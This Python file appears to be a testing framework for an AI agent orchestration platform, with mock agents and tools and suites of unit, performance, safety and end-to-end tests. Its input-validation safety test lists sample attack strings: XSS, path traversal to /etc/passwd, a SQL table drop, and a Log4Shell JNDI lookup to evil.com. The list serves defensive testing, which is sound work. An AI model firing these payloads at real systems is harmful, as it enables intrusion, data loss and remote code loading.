"""
Comprehensive Testing and Validation Framework for Galion Platform v2.2
Provides automated testing, validation, and quality assurance for autonomous systems.

Features:
- Unit testing for all agent components
- Integration testing for workflows
- Performance benchmarking
- Safety and reliability validation
- Mock agents and services
- Test data generation
- Continuous validation monitoring
- Regression testing

"Your imagination is the end."
"""

import asyncio
from typing import Dict, List, Optional, Any, Callable, Set, Tuple
from pydantic import BaseModel, Field
from datetime import datetime, timedelta
from enum import Enum
import logging
import json
import time
import random
import statistics
from pathlib import Path

from .base_agent import BaseAgent, AgentResult, AgentContext, PersonalityTraits, AgentCapabilities
from .agent_orchestrator import AgentOrchestrator
from .autonomous_executor import AutonomousExecutor
from .tool_framework import ToolRegistry, BaseTool, ToolResult
from .workflow_system import WorkflowEngine, WorkflowDefinition
from .realtime_monitor import monitor, MonitoringEventType
from .human_loop import human_loop_manager, ApprovalType
from .context_awareness import context_engine, PreferenceType
from .nlp_processor import nlp_processor, TaskIntent, TaskComplexity, TaskRisk
from .agent_collaboration import collaboration_hub, MessageType

logger = logging.getLogger(__name__)

class TestResult(Enum):
    """Result of a test execution"""
    PASSED = "passed"
    FAILED = "failed"
    SKIPPED = "skipped"
    ERROR = "error"

class TestCategory(Enum):
    """Categories of tests"""
    UNIT = "unit"
    INTEGRATION = "integration"
    PERFORMANCE = "performance"
    SAFETY = "safety"
    REGRESSION = "regression"
    END_TO_END = "end_to_end"

class TestCase(BaseModel):
    """A test case definition"""

    id: str
    name: str
    description: str
    category: TestCategory

    # Test configuration
    timeout_seconds: int = 30
    required_components: List[str] = Field(default_factory=list)
    tags: List[str] = Field(default_factory=list)

    # Test data
    input_data: Dict[str, Any] = Field(default_factory=dict)
    expected_output: Dict[str, Any] = Field(default_factory=dict)

    # Validation rules
    validation_rules: List[Dict[str, Any]] = Field(default_factory=list)

class TestExecution(BaseModel):
    """Result of a test execution"""

    test_id: str
    result: TestResult
    execution_time: float
    timestamp: datetime = Field(default_factory=datetime.now)

    # Results
    actual_output: Dict[str, Any] = Field(default_factory=dict)
    validation_errors: List[str] = Field(default_factory=list)
    error_message: Optional[str] = None

    # Performance metrics
    memory_usage: Optional[float] = None
    cpu_usage: Optional[float] = None

    # Logs and traces
    logs: List[str] = Field(default_factory=list)

class TestSuite(BaseModel):
    """A collection of test cases"""

    id: str
    name: str
    description: str
    category: TestCategory

    test_cases: List[TestCase] = Field(default_factory=list)
    setup_steps: List[Dict[str, Any]] = Field(default_factory=list)
    teardown_steps: List[Dict[str, Any]] = Field(default_factory=list)

    # Execution configuration
    parallel_execution: bool = False
    max_parallel_tests: int = 3
    fail_fast: bool = False

class TestReport(BaseModel):
    """Comprehensive test report"""

    suite_id: str
    suite_name: str
    execution_timestamp: datetime = Field(default_factory=datetime.now)
    total_duration: float = 0.0

    # Results summary
    total_tests: int = 0
    passed_tests: int = 0
    failed_tests: int = 0
    skipped_tests: int = 0
    error_tests: int = 0

    # Detailed results
    test_results: List[TestExecution] = Field(default_factory=list)

    # Performance metrics
    average_execution_time: float = 0.0
    median_execution_time: float = 0.0
    min_execution_time: float = 0.0
    max_execution_time: float = 0.0

    # System metrics
    peak_memory_usage: float = 0.0
    average_cpu_usage: float = 0.0

    # Coverage and quality
    code_coverage: float = 0.0
    quality_score: float = 0.0

class MockAgent(BaseAgent):
    """Mock agent for testing purposes"""

    def __init__(self, name: str, behavior: str = "success", response_delay: float = 0.1):
        super().__init__(
            name=name,
            personality=PersonalityTraits(),
            capabilities=AgentCapabilities(can_execute_code=True),
            description=f"Mock agent: {name}"
        )

        self.behavior = behavior
        self.response_delay = response_delay
        self.call_count = 0
        self.call_history = []

    async def execute(self, prompt: str, context: Optional[AgentContext] = None, **kwargs) -> AgentResult:
        await asyncio.sleep(self.response_delay)
        self.call_count += 1
        self.call_history.append({
            "timestamp": datetime.now(),
            "prompt": prompt,
            "context": context.model_dump() if context else None
        })

        if self.behavior == "success":
            return AgentResult(
                success=True,
                response=f"Mock response from {self.name}: {prompt[:50]}...",
                cost=0.01,
                execution_time=self.response_delay
            )
        elif self.behavior == "failure":
            return AgentResult(
                success=False,
                response="Mock failure response",
                cost=0.01,
                execution_time=self.response_delay,
                error="Mock error"
            )
        elif self.behavior == "slow":
            await asyncio.sleep(2.0)
            return AgentResult(
                success=True,
                response="Slow mock response",
                cost=0.02,
                execution_time=2.1
            )
        else:
            return AgentResult(
                success=False,
                response="Unknown behavior",
                cost=0.01,
                execution_time=self.response_delay,
                error=f"Unknown behavior: {self.behavior}"
            )

class MockTool(BaseTool):
    """Mock tool for testing purposes"""

    def __init__(self, name: str, behavior: str = "success"):
        from .tool_framework import ToolMetadata, ToolParameter
        metadata = ToolMetadata(
            name=name,
            description=f"Mock tool: {name}",
            category=ToolRegistry.__annotations__.get("category", "api_integration"),
            parameters=[ToolParameter(name="input", type="string", description="Input parameter")],
            cost_per_call=0.01
        )

        super().__init__(metadata)
        self.behavior = behavior
        self.call_count = 0

    async def execute(self, parameters: Dict[str, Any]) -> ToolResult:
        self.call_count += 1

        if self.behavior == "success":
            return ToolResult(
                success=True,
                data={"result": f"Mock tool {self.metadata.name} processed: {parameters}"},
                execution_time=0.1,
                cost=self.metadata.cost_per_call
            )
        elif self.behavior == "failure":
            return ToolResult(
                success=False,
                error="Mock tool failure",
                execution_time=0.1,
                cost=self.metadata.cost_per_call
            )
        else:
            return ToolResult(
                success=False,
                error=f"Unknown behavior: {self.behavior}",
                execution_time=0.1,
                cost=self.metadata.cost_per_call
            )

class AgentTestFramework:
    """
    Comprehensive testing framework for agent systems.

    Provides automated testing, validation, and quality assurance.
    """

    def __init__(self):
        self.orchestrator = None
        self.mock_agents: Dict[str, MockAgent] = {}
        self.mock_tools: Dict[str, MockTool] = {}
        self.test_suites: Dict[str, TestSuite] = {}
        self.test_reports: List[TestReport] = []

        # Performance monitoring
        self.performance_baseline = {}
        self.regression_threshold = 0.1  # 10% performance degradation threshold

        self.logger = logging.getLogger(f"{__name__}.framework")

    async def initialize_test_environment(self):
        """Initialize the test environment"""
        # Create orchestrator with mock components
        self.orchestrator = AgentOrchestrator()

        # Register mock agents
        self._create_mock_agents()

        # Register mock tools
        self._create_mock_tools()

        # Initialize collaboration system
        await self.orchestrator.initialize_collaboration()

        self.logger.info("Test environment initialized")

    def _create_mock_agents(self):
        """Create mock agents for testing"""
        mock_configs = [
            ("mock_code_agent", "success"),
            ("mock_analysis_agent", "success"),
            ("mock_failing_agent", "failure"),
            ("mock_slow_agent", "slow"),
            ("mock_customer_agent", "success"),
        ]

        for name, behavior in mock_configs:
            agent = MockAgent(name, behavior)
            self.mock_agents[name] = agent
            self.orchestrator.register_agent(agent)
            self.orchestrator.register_agent_for_collaboration(agent)

    def _create_mock_tools(self):
        """Create mock tools for testing"""
        tool_configs = [
            ("mock_web_search", "success"),
            ("mock_api_tool", "success"),
            ("mock_failing_tool", "failure"),
        ]

        for name, behavior in tool_configs:
            tool = MockTool(name, behavior)
            self.mock_tools[name] = tool
            self.orchestrator.register_tool(tool)

    def create_test_suite(self, suite: TestSuite):
        """Create a test suite"""
        self.test_suites[suite.id] = suite
        self.logger.info(f"Test suite created: {suite.name}")

    async def run_test_suite(self, suite_id: str) -> TestReport:
        """Run a complete test suite"""
        if suite_id not in self.test_suites:
            raise ValueError(f"Test suite not found: {suite_id}")

        suite = self.test_suites[suite_id]
        start_time = time.time()

        # Initialize report
        report = TestReport(
            suite_id=suite_id,
            suite_name=suite.name
        )

        self.logger.info(f"Running test suite: {suite.name}")

        try:
            # Setup
            await self._run_setup_steps(suite.setup_steps)

            # Execute tests
            if suite.parallel_execution:
                report.test_results = await self._run_tests_parallel(suite.test_cases, suite.max_parallel_tests)
            else:
                report.test_results = await self._run_tests_sequential(suite.test_cases, suite.fail_fast)

            # Calculate statistics
            self._calculate_report_statistics(report)

            # Teardown
            await self._run_teardown_steps(suite.teardown_steps)

        except Exception as e:
            self.logger.error(f"Test suite execution failed: {e}")
            report.test_results = []

        report.total_duration = time.time() - start_time
        self.test_reports.append(report)

        # Check for regressions
        self._check_performance_regressions(report)

        self.logger.info(f"Test suite completed: {suite.name} - {report.passed_tests}/{report.total_tests} passed")
        return report

    async def _run_tests_sequential(self, test_cases: List[TestCase], fail_fast: bool) -> List[TestExecution]:
        """Run tests sequentially"""
        results = []

        for test_case in test_cases:
            try:
                result = await self.run_single_test(test_case)
                results.append(result)

                if fail_fast and result.result == TestResult.FAILED:
                    break

            except Exception as e:
                self.logger.error(f"Test execution error: {e}")
                results.append(TestExecution(
                    test_id=test_case.id,
                    result=TestResult.ERROR,
                    execution_time=0.0,
                    error_message=str(e)
                ))

        return results

    async def _run_tests_parallel(self, test_cases: List[TestCase], max_parallel: int) -> List[TestExecution]:
        """Run tests in parallel"""
        semaphore = asyncio.Semaphore(max_parallel)
        tasks = []

        async def run_with_semaphore(test_case):
            async with semaphore:
                return await self.run_single_test(test_case)

        for test_case in test_cases:
            task = asyncio.create_task(run_with_semaphore(test_case))
            tasks.append(task)

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Handle exceptions
        processed_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                processed_results.append(TestExecution(
                    test_id=test_cases[i].id,
                    result=TestResult.ERROR,
                    execution_time=0.0,
                    error_message=str(result)
                ))
            else:
                processed_results.append(result)

        return processed_results

    async def run_single_test(self, test_case: TestCase) -> TestExecution:
        """Run a single test case"""
        start_time = time.time()
        execution = TestExecution(test_id=test_case.id, result=TestResult.ERROR)

        try:
            # Check prerequisites
            if not await self._check_test_prerequisites(test_case):
                execution.result = TestResult.SKIPPED
                execution.logs.append("Prerequisites not met")
                return execution

            # Execute test based on category
            if test_case.category == TestCategory.UNIT:
                result = await self._run_unit_test(test_case)
            elif test_case.category == TestCategory.INTEGRATION:
                result = await self._run_integration_test(test_case)
            elif test_case.category == TestCategory.PERFORMANCE:
                result = await self._run_performance_test(test_case)
            elif test_case.category == TestCategory.SAFETY:
                result = await self._run_safety_test(test_case)
            elif test_case.category == TestCategory.END_TO_END:
                result = await self._run_end_to_end_test(test_case)
            else:
                raise ValueError(f"Unknown test category: {test_case.category}")

            execution.actual_output = result.get("output", {})
            execution.logs = result.get("logs", [])

            # Validate results
            validation_errors = self._validate_test_results(test_case, execution.actual_output)
            execution.validation_errors = validation_errors

            if validation_errors:
                execution.result = TestResult.FAILED
            else:
                execution.result = TestResult.PASSED

        except asyncio.TimeoutError:
            execution.result = TestResult.ERROR
            execution.error_message = "Test timed out"
        except Exception as e:
            execution.result = TestResult.ERROR
            execution.error_message = str(e)
            execution.logs.append(f"Exception: {e}")

        execution.execution_time = time.time() - start_time
        return execution

    async def _check_test_prerequisites(self, test_case: TestCase) -> bool:
        """Check if test prerequisites are met"""
        for component in test_case.required_components:
            if component.startswith("agent:"):
                agent_name = component.split(":", 1)[1]
                if agent_name not in self.orchestrator.agents:
                    return False
            elif component.startswith("tool:"):
                tool_name = component.split(":", 1)[1]
                if not self.orchestrator.get_tool(tool_name):
                    return False

        return True

    async def _run_unit_test(self, test_case: TestCase) -> Dict[str, Any]:
        """Run a unit test"""
        if test_case.input_data.get("component") == "agent":
            return await self._test_agent_unit(test_case)
        elif test_case.input_data.get("component") == "tool":
            return await self._test_tool_unit(test_case)
        elif test_case.input_data.get("component") == "nlp":
            return await self._test_nlp_unit(test_case)
        else:
            return {"output": {}, "logs": ["Unknown unit test component"]}

    async def _run_integration_test(self, test_case: TestCase) -> Dict[str, Any]:
        """Run an integration test"""
        test_type = test_case.input_data.get("type")

        if test_type == "autonomous_execution":
            return await self._test_autonomous_execution_integration(test_case)
        elif test_type == "workflow_execution":
            return await self._test_workflow_execution_integration(test_case)
        elif test_type == "agent_collaboration":
            return await self._test_agent_collaboration_integration(test_case)
        else:
            return {"output": {}, "logs": ["Unknown integration test type"]}

    async def _run_performance_test(self, test_case: TestCase) -> Dict[str, Any]:
        """Run a performance test"""
        test_type = test_case.input_data.get("type")

        if test_type == "response_time":
            return await self._test_response_time_performance(test_case)
        elif test_type == "throughput":
            return await self._test_throughput_performance(test_case)
        elif test_type == "resource_usage":
            return await self._test_resource_usage_performance(test_case)
        else:
            return {"output": {}, "logs": ["Unknown performance test type"]}

    async def _run_safety_test(self, test_case: TestCase) -> Dict[str, Any]:
        """Run a safety test"""
        test_type = test_case.input_data.get("type")

        if test_type == "input_validation":
            return await self._test_input_validation_safety(test_case)
        elif test_type == "resource_limits":
            return await self._test_resource_limits_safety(test_case)
        elif test_type == "error_handling":
            return await self._test_error_handling_safety(test_case)
        else:
            return {"output": {}, "logs": ["Unknown safety test type"]}

    async def _run_end_to_end_test(self, test_case: TestCase) -> Dict[str, Any]:
        """Run an end-to-end test"""
        # Execute a complete autonomous workflow
        prompt = test_case.input_data.get("prompt", "")
        context = test_case.input_data.get("context", {})

        task_id = await self.orchestrator.execute_autonomous(prompt, context=context)

        # Wait for completion (with timeout)
        timeout = test_case.timeout_seconds
        start_time = time.time()

        while time.time() - start_time < timeout:
            status = self.orchestrator.get_autonomous_task_status(task_id)
            if status and status.get("status") in ["completed", "failed"]:
                break
            await asyncio.sleep(0.5)

        final_status = self.orchestrator.get_autonomous_task_status(task_id)

        return {
            "output": {
                "task_id": task_id,
                "final_status": final_status
            },
            "logs": [f"E2E test completed with status: {final_status.get('status') if final_status else 'unknown'}"]
        }

    async def _test_agent_unit(self, test_case: TestCase) -> Dict[str, Any]:
        """Test agent unit functionality"""
        agent_name = test_case.input_data.get("agent_name")
        prompt = test_case.input_data.get("prompt", "")

        if agent_name not in self.orchestrator.agents:
            return {"output": {}, "logs": [f"Agent not found: {agent_name}"]}

        result = await self.orchestrator.execute(prompt, agent_type=agent_name)

        return {
            "output": {
                "agent_name": agent_name,
                "result": result.model_dump()
            },
            "logs": [f"Agent {agent_name} executed successfully"]
        }

    async def _test_tool_unit(self, test_case: TestCase) -> Dict[str, Any]:
        """Test tool unit functionality"""
        tool_name = test_case.input_data.get("tool_name")
        parameters = test_case.input_data.get("parameters", {})

        result = await self.orchestrator.execute_tool(tool_name, parameters)

        return {
            "output": {
                "tool_name": tool_name,
                "result": result.model_dump() if hasattr(result, 'model_dump') else result
            },
            "logs": [f"Tool {tool_name} executed"]
        }

    async def _test_nlp_unit(self, test_case: TestCase) -> Dict[str, Any]:
        """Test NLP unit functionality"""
        text = test_case.input_data.get("text", "")

        analysis = await self.orchestrator.analyze_task_nlp(text)

        return {
            "output": {
                "analysis": analysis.model_dump() if hasattr(analysis, 'model_dump') else analysis
            },
            "logs": ["NLP analysis completed"]
        }

    async def _test_autonomous_execution_integration(self, test_case: TestCase) -> Dict[str, Any]:
        """Test autonomous execution integration"""
        prompt = test_case.input_data.get("prompt", "")

        task_id = await self.orchestrator.execute_autonomous(prompt)

        # Wait a bit for processing
        await asyncio.sleep(2)

        status = self.orchestrator.get_autonomous_task_status(task_id)

        return {
            "output": {
                "task_id": task_id,
                "status": status
            },
            "logs": ["Autonomous execution integration test completed"]
        }

    async def _test_workflow_execution_integration(self, test_case: TestCase) -> Dict[str, Any]:
        """Test workflow execution integration"""
        workflow_def = test_case.input_data.get("workflow_definition", {})

        # Create workflow definition
        workflow = WorkflowDefinition(**workflow_def)
        self.orchestrator.register_workflow(workflow)

        execution_id = await self.orchestrator.execute_workflow(workflow.id)

        return {
            "output": {
                "workflow_id": workflow.id,
                "execution_id": execution_id
            },
            "logs": ["Workflow execution integration test completed"]
        }

    async def _test_agent_collaboration_integration(self, test_case: TestCase) -> Dict[str, Any]:
        """Test agent collaboration integration"""
        participants = test_case.input_data.get("participants", ["mock_code_agent", "mock_analysis_agent"])

        session_id = await self.orchestrator.create_collaboration_session(
            name="Test Collaboration",
            description="Integration test session",
            goal="Test agent collaboration",
            participants=participants
        )

        # Send test message
        await self.orchestrator.send_agent_message(
            sender=participants[0],
            receiver=participants[1],
            message_type=MessageType.STATUS_UPDATE,
            subject="Test Message",
            content={"test": "collaboration"}
        )

        return {
            "output": {
                "session_id": session_id,
                "participants": participants
            },
            "logs": ["Agent collaboration integration test completed"]
        }

    async def _test_response_time_performance(self, test_case: TestCase) -> Dict[str, Any]:
        """Test response time performance"""
        iterations = test_case.input_data.get("iterations", 10)
        agent_name = test_case.input_data.get("agent_name", "mock_code_agent")

        response_times = []

        for i in range(iterations):
            start_time = time.time()
            await self.orchestrator.execute(f"Test prompt {i}", agent_type=agent_name)
            response_time = time.time() - start_time
            response_times.append(response_time)

        avg_response_time = statistics.mean(response_times)
        p95_response_time = statistics.quantiles(response_times, n=20)[18]  # 95th percentile

        return {
            "output": {
                "average_response_time": avg_response_time,
                "p95_response_time": p95_response_time,
                "min_response_time": min(response_times),
                "max_response_time": max(response_times),
                "iterations": iterations
            },
            "logs": [f"Performance test completed: {iterations} iterations"]
        }

    async def _test_throughput_performance(self, test_case: TestCase) -> Dict[str, Any]:
        """Test throughput performance"""
        duration = test_case.input_data.get("duration", 10)
        agent_name = test_case.input_data.get("agent_name", "mock_code_agent")

        start_time = time.time()
        request_count = 0

        while time.time() - start_time < duration:
            await self.orchestrator.execute(f"Test request {request_count}", agent_type=agent_name)
            request_count += 1

        throughput = request_count / duration

        return {
            "output": {
                "total_requests": request_count,
                "duration": duration,
                "throughput_requests_per_second": throughput
            },
            "logs": [f"Throughput test completed: {request_count} requests in {duration}s"]
        }

    async def _test_resource_usage_performance(self, test_case: TestCase) -> Dict[str, Any]:
        """Test resource usage performance"""
        # Simplified resource monitoring
        import psutil
        import os

        process = psutil.Process(os.getpid())

        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        initial_cpu = process.cpu_percent()

        # Run test workload
        tasks = []
        for i in range(10):
            task = self.orchestrator.execute(f"Resource test {i}", agent_type="mock_code_agent")
            tasks.append(task)

        await asyncio.gather(*tasks)

        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        final_cpu = process.cpu_percent()

        return {
            "output": {
                "initial_memory_mb": initial_memory,
                "final_memory_mb": final_memory,
                "memory_delta_mb": final_memory - initial_memory,
                "average_cpu_percent": (initial_cpu + final_cpu) / 2
            },
            "logs": ["Resource usage test completed"]
        }

    async def _test_input_validation_safety(self, test_case: TestCase) -> Dict[str, Any]:
        """Test input validation safety"""
        malicious_inputs = test_case.input_data.get("malicious_inputs", [
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}",
            "javascript:alert('xss')"
        ])

        safe_results = 0
        blocked_results = 0

        for malicious_input in malicious_inputs:
            try:
                # Test agent execution
                result = await self.orchestrator.execute(malicious_input, agent_type="mock_code_agent")
                if result.success:
                    safe_results += 1
                else:
                    blocked_results += 1
            except:
                blocked_results += 1

        return {
            "output": {
                "total_tests": len(malicious_inputs),
                "safe_results": safe_results,
                "blocked_results": blocked_results,
                "safety_score": blocked_results / len(malicious_inputs)
            },
            "logs": ["Input validation safety test completed"]
        }

    async def _test_resource_limits_safety(self, test_case: TestCase) -> Dict[str, Any]:
        """Test resource limits safety"""
        # Test with large inputs and multiple concurrent requests
        large_prompt = "x" * 10000  # 10KB prompt
        concurrent_requests = test_case.input_data.get("concurrent_requests", 10)

        # Test large input handling
        try:
            result = await self.orchestrator.execute(large_prompt, agent_type="mock_code_agent")
            large_input_handled = result.success
        except:
            large_input_handled = False

        # Test concurrent load
        tasks = []
        for i in range(concurrent_requests):
            task = self.orchestrator.execute(f"Concurrent test {i}", agent_type="mock_code_agent")
            tasks.append(task)

        concurrent_results = await asyncio.gather(*tasks, return_exceptions=True)
        successful_concurrent = sum(1 for r in concurrent_results if not isinstance(r, Exception) and hasattr(r, 'success') and r.success)

        return {
            "output": {
                "large_input_handled": large_input_handled,
                "concurrent_requests_attempted": concurrent_requests,
                "concurrent_requests_successful": successful_concurrent,
                "concurrent_success_rate": successful_concurrent / concurrent_requests
            },
            "logs": ["Resource limits safety test completed"]
        }

    async def _test_error_handling_safety(self, test_case: TestCase) -> Dict[str, Any]:
        """Test error handling safety"""
        error_scenarios = [
            ("failing_agent", lambda: self.orchestrator.execute("test", agent_type="mock_failing_agent")),
            ("nonexistent_agent", lambda: self.orchestrator.execute("test", agent_type="nonexistent_agent")),
            ("invalid_tool", lambda: self.orchestrator.execute_tool("nonexistent_tool", {})),
            ("empty_input", lambda: self.orchestrator.execute("", agent_type="mock_code_agent")),
        ]

        handled_errors = 0
        unhandled_errors = 0

        for scenario_name, scenario_func in error_scenarios:
            try:
                result = await scenario_func()
                # Check if error was handled gracefully
                if hasattr(result, 'success') and not result.success:
                    handled_errors += 1
                elif result is None:
                    handled_errors += 1  # None result indicates error was caught
                else:
                    unhandled_errors += 1
            except Exception as e:
                # Exception was not caught - this is bad
                unhandled_errors += 1

        return {
            "output": {
                "total_error_scenarios": len(error_scenarios),
                "handled_errors": handled_errors,
                "unhandled_errors": unhandled_errors,
                "error_handling_score": handled_errors / len(error_scenarios)
            },
            "logs": ["Error handling safety test completed"]
        }

    def _validate_test_results(self, test_case: TestCase, actual_output: Dict[str, Any]) -> List[str]:
        """Validate test results against expected output"""
        errors = []

        for rule in test_case.validation_rules:
            rule_type = rule.get("type")

            if rule_type == "equals":
                field = rule["field"]
                expected = rule["expected"]
                actual = self._get_nested_value(actual_output, field)
                if actual != expected:
                    errors.append(f"Field {field}: expected {expected}, got {actual}")

            elif rule_type == "contains":
                field = rule["field"]
                expected = rule["expected"]
                actual = self._get_nested_value(actual_output, field)
                if expected not in str(actual):
                    errors.append(f"Field {field}: expected to contain '{expected}'")

            elif rule_type == "greater_than":
                field = rule["field"]
                threshold = rule["threshold"]
                actual = self._get_nested_value(actual_output, field)
                if not isinstance(actual, (int, float)) or actual <= threshold:
                    errors.append(f"Field {field}: expected > {threshold}, got {actual}")

            elif rule_type == "less_than":
                field = rule["field"]
                threshold = rule["threshold"]
                actual = self._get_nested_value(actual_output, field)
                if not isinstance(actual, (int, float)) or actual >= threshold:
                    errors.append(f"Field {field}: expected < {threshold}, got {actual}")

        return errors

    def _get_nested_value(self, data: Dict[str, Any], field_path: str) -> Any:
        """Get nested value using dot notation"""
        keys = field_path.split('.')
        current = data

        try:
            for key in keys:
                if isinstance(current, dict):
                    current = current.get(key)
                elif isinstance(current, list) and key.isdigit():
                    current = current[int(key)] if int(key) < len(current) else None
                else:
                    return None

                if current is None:
                    return None

            return current
        except:
            return None

    async def _run_setup_steps(self, setup_steps: List[Dict[str, Any]]):
        """Run test setup steps"""
        for step in setup_steps:
            step_type = step.get("type")

            if step_type == "create_mock_agent":
                agent = MockAgent(
                    step["name"],
                    step.get("behavior", "success"),
                    step.get("delay", 0.1)
                )
                self.orchestrator.register_agent(agent)

            elif step_type == "create_mock_tool":
                tool = MockTool(
                    step["name"],
                    step.get("behavior", "success")
                )
                self.orchestrator.register_tool(tool)

    async def _run_teardown_steps(self, teardown_steps: List[Dict[str, Any]]):
        """Run test teardown steps"""
        for step in teardown_steps:
            step_type = step.get("type")

            if step_type == "cleanup_mock_agents":
                # Remove mock agents created during setup
                agents_to_remove = [name for name in self.orchestrator.agents.keys() if name.startswith("mock_")]
                for agent_name in agents_to_remove:
                    self.orchestrator.unregister_agent(agent_name)

    def _calculate_report_statistics(self, report: TestReport):
        """Calculate statistics for test report"""
        if not report.test_results:
            return

        execution_times = [r.execution_time for r in report.test_results]

        report.total_tests = len(report.test_results)
        report.passed_tests = sum(1 for r in report.test_results if r.result == TestResult.PASSED)
        report.failed_tests = sum(1 for r in report.test_results if r.result == TestResult.FAILED)
        report.skipped_tests = sum(1 for r in report.test_results if r.result == TestResult.SKIPPED)
        report.error_tests = sum(1 for r in report.test_results if r.result == TestResult.ERROR)

        if execution_times:
            report.average_execution_time = statistics.mean(execution_times)
            report.median_execution_time = statistics.median(execution_times)
            report.min_execution_time = min(execution_times)
            report.max_execution_time = max(execution_times)

    def _check_performance_regressions(self, report: TestReport):
        """Check for performance regressions"""
        if report.suite_id not in self.performance_baseline:
            # Establish baseline
            self.performance_baseline[report.suite_id] = {
                "average_time": report.average_execution_time,
                "median_time": report.median_execution_time
            }
            return

        baseline = self.performance_baseline[report.suite_id]

        # Check for regressions
        avg_regression = (report.average_execution_time - baseline["average_time"]) / baseline["average_time"]
        median_regression = (report.median_execution_time - baseline["median_time"]) / baseline["median_time"]

        if avg_regression > self.regression_threshold:
            self.logger.warning(f"Performance regression detected in {report.suite_name}: "
                              f"average time increased by {avg_regression:.1%}")

        if median_regression > self.regression_threshold:
            self.logger.warning(f"Performance regression detected in {report.suite_name}: "
                              f"median time increased by {median_regression:.1%}")

    def generate_comprehensive_test_suite(self) -> TestSuite:
        """Generate a comprehensive test suite covering all components"""
        test_cases = []

        # Unit tests
        test_cases.extend(self._generate_unit_tests())

        # Integration tests
        test_cases.extend(self._generate_integration_tests())

        # Performance tests
        test_cases.extend(self._generate_performance_tests())

        # Safety tests
        test_cases.extend(self._generate_safety_tests())

        # End-to-end tests
        test_cases.extend(self._generate_end_to_end_tests())

        return TestSuite(
            id="comprehensive_agent_test_suite",
            name="Comprehensive Agent System Test Suite",
            description="Complete test coverage for all agent system components",
            category=TestCategory.REGRESSION,
            test_cases=test_cases,
            parallel_execution=True,
            max_parallel_tests=5
        )

    def _generate_unit_tests(self) -> List[TestCase]:
        """Generate unit test cases"""
        return [
            TestCase(
                id="unit_agent_execution",
                name="Agent Execution Unit Test",
                description="Test basic agent execution functionality",
                category=TestCategory.UNIT,
                required_components=["agent:mock_code_agent"],
                input_data={"component": "agent", "agent_name": "mock_code_agent", "prompt": "Hello"},
                expected_output={"result": {"success": True}},
                validation_rules=[
                    {"type": "equals", "field": "result.success", "expected": True}
                ]
            ),
            TestCase(
                id="unit_tool_execution",
                name="Tool Execution Unit Test",
                description="Test basic tool execution functionality",
                category=TestCategory.UNIT,
                required_components=["tool:mock_web_search"],
                input_data={"component": "tool", "tool_name": "mock_web_search", "parameters": {"input": "test"}},
                validation_rules=[
                    {"type": "equals", "field": "result.success", "expected": True}
                ]
            ),
            TestCase(
                id="unit_nlp_analysis",
                name="NLP Analysis Unit Test",
                description="Test NLP task analysis functionality",
                category=TestCategory.UNIT,
                input_data={"component": "nlp", "text": "Create a function to calculate fibonacci numbers"},
                validation_rules=[
                    {"type": "contains", "field": "analysis.intent", "expected": "create"}
                ]
            )
        ]

    def _generate_integration_tests(self) -> List[TestCase]:
        """Generate integration test cases"""
        return [
            TestCase(
                id="integration_autonomous_execution",
                name="Autonomous Execution Integration Test",
                description="Test complete autonomous task execution",
                category=TestCategory.INTEGRATION,
                required_components=["agent:mock_code_agent"],
                input_data={"type": "autonomous_execution", "prompt": "Write a simple hello world function"},
                validation_rules=[
                    {"type": "contains", "field": "status", "expected": "completed"}
                ],
                timeout_seconds=60
            ),
            TestCase(
                id="integration_agent_collaboration",
                name="Agent Collaboration Integration Test",
                description="Test agent-to-agent communication and collaboration",
                category=TestCategory.INTEGRATION,
                required_components=["agent:mock_code_agent", "agent:mock_analysis_agent"],
                input_data={
                    "type": "agent_collaboration",
                    "participants": ["mock_code_agent", "mock_analysis_agent"]
                },
                validation_rules=[
                    {"type": "equals", "field": "participants", "expected": ["mock_code_agent", "mock_analysis_agent"]}
                ]
            )
        ]

    def _generate_performance_tests(self) -> List[TestCase]:
        """Generate performance test cases"""
        return [
            TestCase(
                id="performance_response_time",
                name="Response Time Performance Test",
                description="Test agent response time performance",
                category=TestCategory.PERFORMANCE,
                required_components=["agent:mock_code_agent"],
                input_data={"type": "response_time", "iterations": 20, "agent_name": "mock_code_agent"},
                validation_rules=[
                    {"type": "less_than", "field": "average_response_time", "threshold": 2.0}
                ],
                timeout_seconds=120
            ),
            TestCase(
                id="performance_throughput",
                name="Throughput Performance Test",
                description="Test system throughput under load",
                category=TestCategory.PERFORMANCE,
                input_data={"type": "throughput", "duration": 10, "agent_name": "mock_code_agent"},
                validation_rules=[
                    {"type": "greater_than", "field": "throughput_requests_per_second", "threshold": 5}
                ],
                timeout_seconds=60
            )
        ]

    def _generate_safety_tests(self) -> List[TestCase]:
        """Generate safety test cases"""
        return [
            TestCase(
                id="safety_input_validation",
                name="Input Validation Safety Test",
                description="Test protection against malicious inputs",
                category=TestCategory.SAFETY,
                input_data={"type": "input_validation"},
                validation_rules=[
                    {"type": "greater_than", "field": "safety_score", "threshold": 0.8}
                ]
            ),
            TestCase(
                id="safety_error_handling",
                name="Error Handling Safety Test",
                description="Test graceful error handling",
                category=TestCategory.SAFETY,
                input_data={"type": "error_handling"},
                validation_rules=[
                    {"type": "greater_than", "field": "error_handling_score", "threshold": 0.9}
                ]
            )
        ]

    def _generate_end_to_end_tests(self) -> List[TestCase]:
        """Generate end-to-end test cases"""
        return [
            TestCase(
                id="e2e_simple_task",
                name="Simple Task E2E Test",
                description="Complete end-to-end test of a simple autonomous task",
                category=TestCategory.END_TO_END,
                input_data={"prompt": "Create a simple function that adds two numbers"},
                validation_rules=[
                    {"type": "contains", "field": "final_status.status", "expected": "completed"}
                ],
                timeout_seconds=120
            ),
            TestCase(
                id="e2e_complex_workflow",
                name="Complex Workflow E2E Test",
                description="End-to-end test of a complex multi-step workflow",
                category=TestCategory.END_TO_END,
                input_data={
                    "prompt": "Build a complete user registration system with validation, database storage, and email confirmation",
                    "context": {"project_type": "web_application", "tech_stack": ["nodejs", "mongodb"]}
                },
                validation_rules=[
                    {"type": "contains", "field": "final_status.status", "expected": "completed"}
                ],
                timeout_seconds=300
            )
        ]

# Global test framework instance
test_framework = AgentTestFramework()

# Helper functions for easy testing

async def run_comprehensive_tests() -> TestReport:
    """Run the comprehensive test suite"""
    await test_framework.initialize_test_environment()

    suite = test_framework.generate_comprehensive_test_suite()
    test_framework.create_test_suite(suite)

    return await test_framework.run_test_suite(suite.id)

